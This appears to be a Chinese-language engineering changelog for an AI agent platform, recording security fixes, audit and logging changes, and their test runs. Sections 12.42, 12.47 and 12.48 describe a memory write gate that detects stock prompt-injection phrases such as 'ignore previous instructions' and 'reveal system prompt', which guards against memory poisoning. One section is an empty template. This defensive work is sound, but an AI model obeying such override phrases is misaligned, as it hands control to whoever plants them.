  backend/app/services/agent_context.py backend/tests/runtime/test_session_skill_lifecycle.py \
  backend/tests/runtime/test_recovery_manifest_persistence.py backend/tests/runtime/test_prompt_sections.py \
  backend/tests/services/test_agent_context.py backend/tests/kernel/test_engine.py
```

当前结果:新增红线 6 passed;相关 prompt/session/kernel 回归 113 passed,11 warnings;编译通过;ruff `All checks passed!`。warnings 来自第三方 `lark_oapi` / `websockets` deprecation,与本次改动无关。

### 12.39 2026-06-12 第三十九批:生产 secrets、审批权限与 delegation identity 收口

**范围**
- 生产环境不再允许 `SECRETS_MASTER_KEY` 缺省时启动 plaintext secrets provider;`DEBUG=false` 且 master key 为空直接 fail-fast。
- approval resolver 不再只允许 agent creator / platform_admin;同租户 `org_admin` 可处理 agent approval,跨租户 `org_admin` 仍拒绝。
- delegation 不再依赖 invoker 侧 ContextVar 渗透 `execution_identity`;同步入口、异步后台入口、restart resume metadata 都显式携带 `ExecutionIdentityRef`。
- worker-safe / memory-readonly delegation profile 显式排除 `update_memory` / `retire_memory`,修掉 `CORE_TOOL_NAMES` 扩展后 `agent.memory.write` capability grant 泄漏。

**代码证据**
- `backend/app/services/secrets_provider.py`:新增 `validate_secrets_provider_config(master_key, debug=...)`;生产空 master key 抛 `RuntimeError`。
- `backend/app/main.py`:startup 初始化 secrets provider 前先调用 `validate_secrets_provider_config()`。
- `backend/app/services/approval_service.py`:新增 `_can_resolve_agent_approval()`;`resolve_approval()` 改用 creator/platform_admin/同租户 org_admin 判定。
- `backend/app/agents/orchestrator.py`:新增 `_capture_execution_identity_ref()`、`_execution_identity_to_metadata()`、`_execution_identity_from_metadata()`;`AgentDelegationRequest` 增加 `execution_identity` 字段。
- `backend/app/agents/orchestrator.py`:`delegate_to_agent()`、`delegate_async()` 构造 request 时捕获 identity;`_build_runtime_task_metadata()` 持久化 identity;`resume_persisted_async_delegations()` 恢复 identity;`AgentInvocationRequest` 显式接收该字段。
- `backend/app/agents/orchestrator.py`:`worker_safe` / `memory_readonly` profile 排除 `update_memory`、`retire_memory`,避免 delegation token 授予 `agent.memory.write`。

**回归测试**

Red 阶段失败摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main
pytest backend/tests/services/test_secrets_provider.py \
  backend/tests/services/test_approval_service.py::test_org_admin_can_resolve_same_tenant_agent_approval \
  backend/tests/services/test_approval_service.py::test_org_admin_cannot_resolve_other_tenant_agent_approval \
  backend/tests/agents/test_orchestrator.py::test_delegate_to_agent_builds_runtime_request \
  backend/tests/agents/test_orchestrator.py::test_delegate_async_captures_execution_identity_before_background_spawn -q
```

初始结果:6 failed。失败点分别为 `validate_secrets_provider_config` 不存在、`_can_resolve_agent_approval` 不存在、`AgentDelegationRequest` 无 `execution_identity` 字段;同轮还暴露旧测试里的 worker-safe delegation token 仍包含 `agent.memory.write`。

Green 阶段通过摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main
pytest backend/tests/services/test_secrets_provider.py \
  backend/tests/services/test_approval_service.py::test_org_admin_can_resolve_same_tenant_agent_approval \
  backend/tests/services/test_approval_service.py::test_org_admin_cannot_resolve_other_tenant_agent_approval \
  backend/tests/agents/test_orchestrator.py::test_delegate_to_agent_builds_runtime_request \
  backend/tests/agents/test_orchestrator.py::test_delegate_async_captures_execution_identity_before_background_spawn \
  backend/tests/agents/test_orchestrator.py::test_resume_persisted_async_delegations_rehydrates_tasks -q
```

当前结果:7 passed,11 warnings。warnings 来自第三方 `lark_oapi` / `websockets` deprecation,与本次改动无关。

### 12.40 2026-06-12 第四十批:审计 hash 链与读工具审计收口

**范围**
- `SecurityAuditEvent` hash 不再只覆盖 event/actor/action/prev_hash;`severity/resource/details/ip/request_id` 纳入 canonical hash 输入,`details` 篡改可被 verify 检出。
- prev_hash 查询不再跨租户取全局最新事件;按 `tenant_id` scoped 查询同租户上一条事件。
- PostgreSQL 部署下写审计事件前对 tenant 级链路加 `pg_advisory_xact_lock`,避免同租户并发写入同时读取同一个 `prev_hash` 造成链分叉。
- `verify_chain()` 改用 writer 同一个 `compute_audit_event_hash()` 函数,并将 predecessor lookup 同样收窄到 tenant 范围。
- `ToolRuntimeService.execute()` / `execute_approved()` 不再跳过 `list_files/read_file/read_document`;读类工具也写 activity log。

**代码证据**
- `backend/app/core/policy.py`:新增 `compute_audit_event_hash()`、`_audit_chain_lock_key()`、`_lock_audit_chain()`;`write_audit_event()` 先取 tenant advisory lock,再按 tenant 查询 previous hash,最后用 canonical hash 写入。
- `backend/app/services/audit_query_service.py`:移除本地旧 hash 算法,`verify_chain()` 直接调用 `compute_audit_event_hash()`;predecessor 查询加入 `SecurityAuditEvent.tenant_id == tenant_id`。
- `backend/app/tools/service.py`:移除 success/timeout/exception/approved 分支中对 `("list_files","read_file","read_document")` 的 activity log 排除条件。

**回归测试**

Red 阶段失败摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main
pytest backend/tests/core/test_policy_audit.py::test_write_audit_event_hash_covers_details \
  backend/tests/core/test_policy_audit.py::test_write_audit_event_previous_hash_query_is_tenant_scoped \
  backend/tests/tools/test_service.py::test_tool_runtime_service_logs_readonly_tool_calls \
  backend/tests/tools/test_service.py::test_tool_runtime_service_execute_approved_logs_readonly_tools -q
```

初始结果:4 failed。失败点分别为不同 `details` 产生相同 `event_hash`、previous hash 查询 SQL 不含 `tenant_id`、普通读工具没有 activity log、approved 读工具没有 activity log。

Green 阶段通过摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main
pytest backend/tests/core/test_policy_audit.py::test_write_audit_event_hash_covers_details \
  backend/tests/core/test_policy_audit.py::test_write_audit_event_previous_hash_query_is_tenant_scoped \
  backend/tests/tools/test_service.py::test_tool_runtime_service_logs_readonly_tool_calls \
  backend/tests/tools/test_service.py::test_tool_runtime_service_execute_approved_logs_readonly_tools -q

pytest backend/tests/core/test_policy_audit.py \
  backend/tests/tools/test_service.py::test_tool_runtime_service_executes_through_registry_and_logs \
  backend/tests/tools/test_service.py::test_tool_runtime_service_logs_readonly_tool_calls \
  backend/tests/tools/test_service.py::test_tool_runtime_service_execute_approved_logs_approval_metadata \
  backend/tests/tools/test_service.py::test_tool_runtime_service_execute_approved_logs_readonly_tools \
  backend/tests/tools/test_service.py::test_tool_runtime_service_logs_structured_tool_errors -q
```

当前结果:新增红线 4 passed;相关 policy/tool 回归 9 passed,10 warnings。warnings 来自第三方 `lark_oapi` / `websockets` deprecation,与本次改动无关。

### 12.41 2026-06-12 第四十一批:JSON logs 与 daemon trace 稳定化

**范围**
- 日志默认输出从彩色文本切换为 loguru JSON (`serialize=True`),生产日志可被日志平台结构化解析。
- 无请求上下文的 daemon/background 日志不再每条记录临时 `uuid4()`;统一使用进程级稳定 `process-<id>` trace fallback,避免同一 daemon loop 的连续日志在观测面看起来互不相干。
- 保留 `HIVE_LOG_FORMAT=text|pretty|plain` 作为本地可读文本兜底;默认仍是 JSON。
- 原有 standard logging intercept、WebSocket/Lark query 清洗、noisy client logger 升级到 WARNING 均保持。

**代码证据**
- `backend/app/core/logging_config.py`:新增 `_PROCESS_TRACE_ID`、`clear_trace_id()`、`enrich_log_record()`;`configure_logging()` 默认 `HIVE_LOG_FORMAT=json`,并用 `serialize=True` 输出 JSON。
- `backend/app/core/logging_config.py`:filter 不再执行 `str(uuid4())`;所有无上下文记录走稳定 process trace。
- `backend/tests/core/test_logging_config.py`:新增 JSON 输出与稳定 fallback trace 测试,保留原敏感 query sanitization 回归。

**回归测试**

Red 阶段失败摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main
pytest backend/tests/core/test_logging_config.py::test_log_record_enrichment_uses_stable_process_trace_without_context \
  backend/tests/core/test_logging_config.py::test_configure_logging_defaults_to_json -q
```

初始结果:2 failed。失败点为 `clear_trace_id/enrich_log_record` 不存在,且默认配置没有 JSON sink/稳定 fallback trace。

Green 阶段通过摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main
pytest backend/tests/core/test_logging_config.py -q
```

当前结果:5 passed。

### 12.42 2026-06-12 第四十二批:team_memory 写门与记忆 prompt-injection 机械兜底

**范围**
- `prepare_memory_write()` 增加 `_MEMORY_THREAT_PATTERNS`,对 `ignore previous instructions`、`system prompt override`、`reveal system prompt` 等记忆内容里的 prompt-injection bait 直接拒绝,不等到 prompt 读取阶段才处理。
- `prepare_memory_write()` 增加 `enforce_form` 参数:T2/T3 默认仍执行 memory form lint;team memory 作为共享文档走同一隐私/注入 gate,但不强制每篇文档满足单条 durable fact 形式。
- `TeamMemoryStore.upsert_entry()` 服务层接入 `prepare_memory_write(enforce_form=False)`,持久化净化后的正文;PL4 credential 继续以 `SecretScanError` 兼容旧调用方,prompt-injection 等其它拒绝以 `TeamMemoryWriteRejectedError` 返回。
- Team memory HTTP upsert 捕获 `TeamMemoryWriteRejectedError`,返回 400,不冒成 500。

**代码证据**
- `backend/app/memory/write_gate.py`:新增 `_MEMORY_THREAT_PATTERNS`、`_detect_memory_threats()`、`enforce_form` 参数;威胁命中返回 `sensitivity=PL3_prompt_injection` 且 `status=rejected`。
- `backend/app/services/team_memory.py`:新增 `TeamMemoryWriteRejectedError`;`upsert_entry()` 调用 `_prepare_content_for_write()` 并写入 `decision.content`。
- `backend/app/api/memory.py`:upsert shared memory 捕获 `TeamMemoryWriteRejectedError`。

**回归测试**

Red 阶段失败摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main
pytest backend/tests/memory/test_write_gate.py::test_prepare_memory_write_rejects_prompt_injection_bait \
  backend/tests/services/test_team_memory_service.py::test_team_memory_store_masks_pii_through_write_gate \
  backend/tests/services/test_team_memory_service.py::test_team_memory_store_rejects_prompt_injection_through_write_gate -q
```

初始结果:3 failed。失败点分别为 write_gate 未拒绝 prompt injection、team memory 持久化明文 PII、`TeamMemoryWriteRejectedError` 不存在。

Green 阶段通过摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main
pytest backend/tests/memory/test_write_gate.py::test_prepare_memory_write_rejects_prompt_injection_bait \
  backend/tests/services/test_team_memory_service.py::test_team_memory_store_masks_pii_through_write_gate \
  backend/tests/services/test_team_memory_service.py::test_team_memory_store_rejects_prompt_injection_through_write_gate -q

pytest backend/tests/memory/test_write_gate.py \
  backend/tests/services/test_team_memory_service.py \
  backend/tests/api/test_memory_api.py -q
```

当前结果:新增红线 3 passed;相关 write_gate/team_memory/API 回归 22 passed。

### 12.43 2026-06-12 第四十三批:heartbeat outcome lane 标记修正

**范围**
- `[OUTCOME:curated]` 不再被 parser 折叠成 `action_taken`;保留 `curated` 作为独立 outcome。
- 新增统一 helper:`_heartbeat_outcome_lane()`、`_heartbeat_counts_as_useful()`、`_heartbeat_action_label()`;scorecard、lineage、activity log、hook metadata、RuntimeTask metadata 共用同一语义。
- `curated` 属于 `memory_curation` lane,score>=5 时计入 useful heartbeat;`action_taken` 属于 `agent_action` lane;`noop` 属于 `idle`;failure/crash 属于 failure lane。
- lineage entry 新增 `- Lane: ...`;activity detail / HEARTBEAT_TICK_END hook / RuntimeTask metadata 增加 `outcome_lane`。

**代码证据**
- `backend/app/services/heartbeat.py`:`_parse_heartbeat_outcome()` 保留 `curated`;fallback 看到 `CURATED` 时也归为 curated。
- `backend/app/services/heartbeat.py`:`_update_evolution_files()` 用 `_heartbeat_counts_as_useful()` 更新 scorecard,并写入 lineage lane。
- `backend/app/services/heartbeat.py`:`_execute_heartbeat()` 的 activity detail、hook metadata、runtime task metadata 均写入 `outcome_lane`;hook action 字段通过 `_heartbeat_action_label()` 统一生成。

**回归测试**

Red 阶段失败摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main
pytest backend/tests/services/test_heartbeat.py::test_parse_heartbeat_outcome_accepts_curated_alias \
  backend/tests/services/test_heartbeat.py::test_update_evolution_files_counts_curated_as_useful_lane -q
```

初始结果:2 failed。失败点为 `curated` 被改写成 `action_taken`,且 `_update_evolution_files(... outcome_type="curated", score=7)` 未计入 useful heartbeat。

Green 阶段通过摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main
pytest backend/tests/services/test_heartbeat.py::test_parse_heartbeat_outcome_accepts_curated_alias \
  backend/tests/services/test_heartbeat.py::test_update_evolution_files_counts_curated_as_useful_lane -q

pytest backend/tests/services/test_heartbeat.py -q
```

当前结果:新增红线 2 passed;heartbeat 服务回归 31 passed,11 warnings。warnings 来自第三方 `lark_oapi` / `websockets` deprecation,与本次改动无关。


**范围**

**代码证据**

**回归测试**

Red 阶段失败摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main
```


Green 阶段通过摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main

```


### 12.45 2026-06-12 第四十五批:全量验收漂移收口

**范围**
- 全量 backend pytest 暴露的旧测试/契约漂移全部收口,不留下“聚焦测试绿、全量测试红”的断点。
- Kernel 对旧 `RuntimeConfig` 测试桩与外部调用保持兼容:`turn_token_budget` 缺省时按 `None` 处理,不因新增预算字段崩溃。
- 可选增强 adapter trigger policy 文档与 allowlist 同步新增 governed memory mutation tools;`update_memory` / `retire_memory` 后的 active/archive 边界可立即同步,且不再被策略测试判为未登记旁路。
- Runtime memory section 中 supersession metadata 不再被 skill capability scanner 误判成未声明工具名;subagent generation、extract/session/dream/skill-distiller 测试桩同步到当前 usage-aware helper 签名。
- migration single-head contract 更新到当前链尾 `web_chat_active_run_unique_0612`,与本轮新增 token usage / active web-chat unique migrations 一致。

**代码证据**
- `backend/app/kernel/engine.py`:读取 `turn_token_budget` 改为 `getattr(runtime_config, "turn_token_budget", None)`。
- `backend/app/memory/enhancement.py`:canonical trigger boundary 保留 governed mutation window。
- `backend/tests/architecture/test_native_t3_memory_boundary.py`:断言 T3 链路不再硬编码具体外部记忆程序。
- `backend/app/runtime/prompt_sections/memory.py`:把 backtick metadata key 改为普通 supersession 描述,避免 capability scanner 误报。
- `backend/tests/migrations/test_workflow_migration.py`:single-head 断言更新到当前 Alembic head。

**验收命令**

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main
pytest backend/tests -q
ruff check backend/app backend/tests
python -m compileall -q backend/app backend/tests

cd /Users/example-owner/vc-saas/hiveclaw-main/frontend
npm run build
npm run test
```

复核更正(2026-06-12):本节后端命令若绑定到全局 Python 3.13,会因未安装 `testcontainers` 产生 `3990 passed,155 skipped,11 warnings`,其中真实 PostgreSQL/Testcontainers 覆盖被整体跳过。因此本节旧数字不能作为真 PG 全量验收结论;后端最终验收以 §12.46 的 `backend/.venv/bin/python -m pytest backend/tests -q` 为准。frontend build/Vitest 与 ruff/compileall 结果仍作为当时前端与静态检查证据保留。

### 12.46 2026-06-12 第四十六批:Claude review 部署红线与真 PG 验收收口

**范围**
- 关闭 §12.45 暴露的验收环境盲区:后端全量验收必须使用已安装 dev extras/testcontainers 的 `backend/.venv` 解释器,不能用全局 Python 的 skip 结果冒充真 PG。
- 生产镜像补齐 `bubblewrap`,使 `HIVE_CODE_SANDBOX_MODE=auto` 在 Linux 容器内能进入 `bwrap` sandbox,不再因镜像缺依赖而 fail-closed 拒绝所有 `execute_code/run_command`。
- `docker-compose.yml` 转发 `DEBUG` 与 `SECRETS_MASTER_KEY`;本节先补齐变量透传,默认值在后续 §12.48 进一步收紧为 `DEBUG=false`,避免默认 compose 绕过生产 secrets fail-fast。
- Alembic `alembic_version.version_num` 从旧默认 `VARCHAR(32)` 扩到 `VARCHAR(255)`,并在 bootstrap path 与正常 Alembic path 都先建/改宽,避免 `rls_stage2c_drop_orphan_tables_0611` 这类长 revision id 在真 PG 上截断。

**代码证据**
- `Dockerfile` / `backend/Dockerfile`:production apt install 均加入 `bubblewrap`。
- `docker-compose.yml`:backend service environment 增加 `DEBUG` 与 `SECRETS_MASTER_KEY` 透传;`DEBUG` 默认值由 §12.48 收紧为 `${DEBUG:-false}`。
- `backend/app/db_bootstrap.py`:新增 `ensure_alembic_version_table_width()`,bootstrap 与 `run_migrations_with_bootstrap()` 正常迁移 path 均调用;PostgreSQL 执行 `ALTER TABLE alembic_version ALTER COLUMN version_num TYPE VARCHAR(255)`。
- `backend/tests/architecture/test_deployment_contracts.py`:新增部署契约测试,防止生产镜像再次漏装 `bubblewrap` 或 compose 漏转发 secrets/debug。
- `backend/tests/test_alembic_bootstrap.py`:新增 `VARCHAR(255)` schema 与长 revision id 覆盖;正常迁移 path 也断言会准备宽表。

**回归测试**

Red 阶段失败摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main
pytest backend/tests/architecture/test_deployment_contracts.py \
  backend/tests/test_alembic_bootstrap.py::test_bootstrap_alembic_version_accepts_long_revision_ids \
  backend/tests/test_alembic_bootstrap.py::test_normal_migration_path_prepares_wide_alembic_version_table \
```


Green 阶段通过摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main
pytest backend/tests/architecture/test_deployment_contracts.py \
  backend/tests/test_alembic_bootstrap.py::test_bootstrap_alembic_version_accepts_long_revision_ids \
  backend/tests/test_alembic_bootstrap.py::test_normal_migration_path_prepares_wide_alembic_version_table \

pytest backend/tests/test_alembic_bootstrap.py \
  backend/tests/architecture/test_deployment_contracts.py -q

backend/.venv/bin/python -m pytest backend/tests -q
```

当批结果:聚焦红线 `7 passed,10 warnings`;相关 Alembic/DR/deployment 回归 `27 passed,5 skipped,11 warnings`;真实 PG/Testcontainers 关键目录 `668 passed,4 warnings`;后端全量真 PG `4138 passed,7 skipped,4 warnings`。后续 §12.47 新增设计缺陷测试后,最终后端全量真 PG 口径更新为 `4144 passed,7 skipped`;ruff `All checks passed!`。warnings 来自第三方 `lark_oapi` / `websockets` deprecation,与本次改动无关。

### 12.47 2026-06-12 第四十七批:Claude review 设计缺陷收口

**范围**
- 审计 hash verify 兼容 pre-§12.40 历史算法:旧事件仍按 `legacy_v1` 判定有效,新事件继续按覆盖 `details/severity/resource/ip/request` 的 `canonical_v2` 判定,不把历史数据全部误报 tampered。
- Approval resolution 不再持有审批/审计事务执行外部动作:状态、AuditLog 与 SecurityAuditEvent 先 flush+commit,释放 tenant advisory transaction lock 后再调用 approved tool,避免同租户审计写被外部动作阻塞。
- `prepare_memory_write()` 的机械 prompt-injection 兜底补齐多限定词英文与中文攻击短语;明显标注为 prompt-injection example/attack 且写明不要遵循的 meta-memory 不再误杀。
- T2 distillation 的 write gate reject 不再静默 `continue`;记录带 agent/category/source/reason 的 warning,让丢弃可观测。
- 读工具审计仍保留,但不再每条工具日志都重复 BYPASS 查 tenant:ToolRuntimeService 把已解析的 `runtime_context.tenant_id` 透传给 `log_activity()`,activity logger 仅在缺 tenant_id 时才回退 resolver;resolver 本身增加 bounded process-local cache。
- `turn_token_budget` 不再只存在于测试构造;`_resolve_runtime_config()` 按 agent `max_tool_rounds` 派生生产默认 turn budget,接入 kernel 既有预算消费逻辑。

**代码证据**
- `backend/app/core/policy.py`:新增 `compute_legacy_audit_event_hash()`。
- `backend/app/services/audit_query_service.py`:`verify_chain()` 先算 canonical v2,再算 legacy v1,返回 `hash_version`。
- `backend/app/services/approval_service.py`:`resolve_approval()` 在 approved action 之前执行 `flush()` + `commit()`。
- `backend/app/memory/write_gate.py`:扩展 `_MEMORY_THREAT_PATTERNS`,新增 `_META_MEMORY_SAFE_PATTERNS` 与 `_is_labeled_prompt_injection_meta_memory()`。
- `backend/app/memory/t2_store.py`:write gate reject 时记录 `[T2Store] write gate rejected extraction ...` warning。
- `backend/app/services/activity_logger.py`:新增可选 `tenant_id`;`backend/app/tools/service.py` 在 normal/approved/error/preflight activity logging 全部透传 `runtime_context.tenant_id`。
- `backend/app/services/tenant_resolver.py`:新增 bounded `_AGENT_TENANT_CACHE` 与 `clear_tenant_resolution_cache()`。
- `backend/app/runtime/invoker.py`:新增 `_derive_turn_token_budget()` 并写入成功路径 `RuntimeConfig.turn_token_budget`。

**回归测试**

Red 阶段失败摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main
backend/.venv/bin/python -m pytest \
  backend/tests/services/test_audit_query_service.py::test_verify_chain_accepts_legacy_pre_details_hashes \
  backend/tests/services/test_approval_service.py::test_resolve_approval_commits_before_approved_external_action \
  backend/tests/memory/test_write_gate.py::test_prepare_memory_write_rejects_multi_qualifier_and_chinese_prompt_injection \
  backend/tests/memory/test_write_gate.py::test_prepare_memory_write_allows_labeled_prompt_injection_meta_memory \
  backend/tests/memory/test_t2_store.py::test_append_t2_entries_logs_write_gate_rejections \
  backend/tests/services/test_tenant_resolver.py::test_resolve_tenant_for_agent_caches_successful_agent_lookup \
  backend/tests/runtime/test_invoker.py::test_resolve_runtime_config_defaults_skill_candidate_loop_to_true_when_missing -q

backend/.venv/bin/python -m pytest \
  backend/tests/tools/test_service.py::test_tool_runtime_service_logs_readonly_tool_calls \
  backend/tests/tools/test_service.py::test_tool_runtime_service_execute_approved_logs_readonly_tools -q
```

初始结果:第一组 `7 failed,4 warnings`;第二组 `2 failed,3 warnings`。失败点分别为 legacy hash 被判 invalid、approval 执行动作前没有 commit、英文多限定词/中文注入漏检、meta-memory 被 prompt-injection 误杀、T2 reject 无日志、tenant resolver 无 cache、生产 RuntimeConfig 不填 turn budget、ToolRuntimeService 不向 activity logger 透传 tenant_id。

Green 阶段通过摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main
backend/.venv/bin/python -m pytest \
  backend/tests/services/test_audit_query_service.py::test_verify_chain_accepts_legacy_pre_details_hashes \
  backend/tests/services/test_approval_service.py::test_resolve_approval_commits_before_approved_external_action \
  backend/tests/memory/test_write_gate.py::test_prepare_memory_write_rejects_multi_qualifier_and_chinese_prompt_injection \
  backend/tests/memory/test_write_gate.py::test_prepare_memory_write_allows_labeled_prompt_injection_meta_memory \
  backend/tests/memory/test_t2_store.py::test_append_t2_entries_logs_write_gate_rejections \
  backend/tests/services/test_tenant_resolver.py::test_resolve_tenant_for_agent_caches_successful_agent_lookup \
  backend/tests/runtime/test_invoker.py::test_resolve_runtime_config_defaults_skill_candidate_loop_to_true_when_missing -q

backend/.venv/bin/python -m pytest backend/tests/services/test_audit_query_service.py \
  backend/tests/core/test_policy_audit.py \
  backend/tests/services/test_approval_service.py \
  backend/tests/memory/test_write_gate.py \
  backend/tests/memory/test_t2_store.py \
  backend/tests/services/test_tenant_resolver.py \
  backend/tests/tools/test_service.py \
  backend/tests/runtime/test_invoker.py::test_resolve_runtime_config_defaults_skill_candidate_loop_to_true_when_missing \
  backend/tests/runtime/test_invoker.py::test_resolve_runtime_config_agent_not_found_sets_tenant_error \
  backend/tests/runtime/test_invoker.py::test_resolve_runtime_config_db_exception_sets_tenant_error \
  backend/tests/runtime/test_invoker.py::test_resolve_runtime_config_success_does_not_set_tenant_error -q

backend/.venv/bin/python -m compileall -q backend/app backend/tests
backend/.venv/bin/python -m pytest backend/tests -q
```

当前结果:聚焦红线第一组 `7 passed,4 warnings`;ToolRuntimeService tenant 透传红线 `2 passed,3 warnings`;相关 audit/approval/memory/tenant/tool/runtime 回归 `53 passed,4 warnings`;ruff `All checks passed!`;compileall 通过;后端全量真 PG `4144 passed,7 skipped,4 warnings`。warnings 来自第三方 `lark_oapi` / `websockets` deprecation,与本次改动无关。

### 12.48 2026-06-12 第四十八批:write_gate LLM-primary 与 compose 生产默认最终收口

**范围**
- 关闭 Claude review 复核后唯一剩余的 L1 债:`write_gate` 不再把需要语义判断的 durable memory threat classification 交给机械正则主路径;LLM classifier 是 async runtime 的 primary,正则只作为可观测 fallback。
- 合法业务保密不再被 `do not tell the user ...` 一刀切误杀;prompt-injection、system prompt exfiltration、中文/英文绕过指令仍会被 LLM primary 或 regex fallback 拒绝。
- T2 extraction/backfill、T3 `save_memory` 主链、team/shared memory API、subagent memory writeback、SESSION_CLOSE ledger settlement 全部接入 `prepare_memory_write_with_llm()`;同步 `prepare_memory_write()` 只保留为 legacy/offline/test fallback,且 metadata 标记 `threat_gate_method=regex_fallback`。
- T2/T3/team-memory reject 均有可观测证据:T2 reject warning 保留;LLM classifier 失败会记录 `[WriteGate] LLM threat classifier failed` warning,并在 metadata 写入 `threat_gate_fallback_error`。
- `docker-compose.yml` 默认 `DEBUG=false`,并继续转发 `SECRETS_MASTER_KEY`;默认 compose 不再绕过生产 secrets fail-fast。开发环境若确需 debug,必须显式 `DEBUG=true` 或提供 `SECRETS_MASTER_KEY`。
- 顺手清理路径一致性债:`consolidate_ledger_findings_to_t2(... data_root=...)` 现在读取和写入使用同一个 `data_root`,不再加载测试/迁移 root 后写回 settings root。

**代码证据**
- `backend/app/memory/write_gate.py`:新增 `MemoryThreatAssessment`、`prepare_memory_write_with_llm()`、`classify_memory_write_threat_with_llm()`、`_parse_llm_threat_assessment()`、`_regex_threat_assessment()`、`_stamp_threat_metadata()`;`prepare_memory_write()` 接受已判断的 `threat_assessment`,避免重复机械判断。
- `backend/app/memory/write_gate.py`:移除机械 `do not tell the user` 拒绝模式;LLM prompt 明确区分“业务保密策略”与“隐藏不当行为/绕过治理/泄露系统提示”的 future-agent 指令。
- `backend/app/memory/t2_store.py`:新增 `append_t2_entries_with_llm()` 并把 LLM decision 传入既有 `append_t2_entries()` 写入核心,避免 T2 文件写逻辑分叉。
- `backend/app/memory/t3_store.py`:T3 governed append 入口改为 `await prepare_memory_write_with_llm(... tenant_id, agent_id)`。
- `backend/app/services/extract_agent.py`:新增 `_append_to_learnings_with_llm()` 和 `consolidate_ledger_findings_to_t2_with_llm()`;`ExtractAgent._do_extract()` 与 T0 backfill 写 T2 改走 async LLM gate;同步 helper 增加 `data_root` 参数并只作为 fallback。
- `backend/app/runtime/hooks_setup.py`:SESSION_CLOSE ledger settlement 改为 `await consolidate_ledger_findings_to_t2_with_llm(...)`,并从 hook metadata 传入 tenant。
- `backend/app/services/team_memory.py`:新增 `_prepare_content_for_write_with_llm()` 与 `upsert_entry_async()`;`backend/app/api/memory.py` 的 shared memory upsert 改为 `await store.upsert_entry_async(...)`。
- `backend/app/agents/subagent_memory.py`:新增 `record_how_with_llm()`;`distill_and_record()` 改走该 async gate。`backend/app/agents/subagent.py` 的 production writeback 传入 `ctx.tenant_id` 与 parent `agent_id`。
- `docker-compose.yml`:backend environment 的 `DEBUG` 默认值从 `${DEBUG:-true}` 改为 `${DEBUG:-false}`,`SECRETS_MASTER_KEY` 继续显式转发。
- `backend/tests/memory/test_write_gate.py`:覆盖业务保密允许、LLM primary accept/reject、classifier 失败 observable fallback。
- `backend/tests/memory/test_t2_store.py` / `backend/tests/memory/test_t3_store.py` / `backend/tests/services/test_team_memory_service.py`:覆盖 T2/T3/team-memory async runtime path 真调用 LLM write gate。
- `backend/tests/agents/test_subagent_memory.py`:覆盖 subagent memory async writeback 真调用 LLM write gate 并透传 tenant/agent。
- `backend/tests/architecture/test_deployment_contracts.py`:compose 契约断言更新为 `DEBUG: ${DEBUG:-false}`。
- `backend/tests/services/test_extract_agent.py` / `backend/tests/services/test_extract_queue_replay.py`:runtime/backfill 测试 mock 目标改为 `_append_to_learnings_with_llm`,防止测试继续保护旧同步路径。

**回归测试**

Red 阶段失败摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main
backend/.venv/bin/python -m pytest \
  backend/tests/memory/test_write_gate.py::test_prepare_memory_write_allows_business_confidentiality \
  backend/tests/memory/test_write_gate.py::test_prepare_memory_write_with_llm_primary_accepts_business_confidentiality \
  backend/tests/memory/test_write_gate.py::test_prepare_memory_write_with_llm_primary_rejects_prompt_injection \
  backend/tests/memory/test_write_gate.py::test_prepare_memory_write_with_llm_falls_back_observably_when_classifier_fails \
  backend/tests/memory/test_t2_store.py::test_append_t2_entries_with_llm_uses_primary_write_gate \
  backend/tests/memory/test_t3_store.py::test_append_t3_memory_candidate_uses_llm_primary_write_gate \
  backend/tests/architecture/test_deployment_contracts.py::test_docker_compose_forwards_debug_and_secrets_master_key -q
```

初始结果:`7 failed`。失败点分别为合法业务保密被 `deception_hide` 误杀、`MemoryThreatAssessment` / `prepare_memory_write_with_llm` 不存在、T2/T3 没有导入或调用 LLM write gate、compose 默认仍是 `DEBUG: ${DEBUG:-true}`。

Green 阶段通过摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main
backend/.venv/bin/python -m pytest \
  backend/tests/memory/test_write_gate.py::test_prepare_memory_write_allows_business_confidentiality \
  backend/tests/memory/test_write_gate.py::test_prepare_memory_write_with_llm_primary_accepts_business_confidentiality \
  backend/tests/memory/test_write_gate.py::test_prepare_memory_write_with_llm_primary_rejects_prompt_injection \
  backend/tests/memory/test_write_gate.py::test_prepare_memory_write_with_llm_falls_back_observably_when_classifier_fails \
  backend/tests/memory/test_t2_store.py::test_append_t2_entries_with_llm_uses_primary_write_gate \
  backend/tests/memory/test_t3_store.py::test_append_t3_memory_candidate_uses_llm_primary_write_gate \
  backend/tests/services/test_team_memory_service.py::test_team_memory_async_upsert_uses_llm_primary_write_gate \
  backend/tests/architecture/test_deployment_contracts.py::test_docker_compose_forwards_debug_and_secrets_master_key -q

backend/.venv/bin/python -m pytest backend/tests/memory/test_write_gate.py \
  backend/tests/memory/test_t2_store.py \
  backend/tests/memory/test_t3_store.py \
  backend/tests/services/test_team_memory_service.py \
  backend/tests/architecture/test_deployment_contracts.py -q

backend/.venv/bin/python -m pytest backend/tests/services/test_extract_agent.py \
  backend/tests/services/test_ledger_to_memory_gate.py \
  backend/tests/services/test_extract_queue_replay.py \
  backend/tests/test_memory_integration.py -q

backend/.venv/bin/python -m pytest backend/tests/agents/test_subagent_memory.py \
  backend/tests/agents/test_subagent.py \
  backend/tests/agents/test_subagent_scope_resolution.py \
  backend/tests/agents/test_subagent_evolution.py -q

backend/.venv/bin/ruff check backend/app backend/tests
backend/.venv/bin/python -m compileall -q backend/app backend/tests
backend/.venv/bin/python -m pytest backend/tests -q

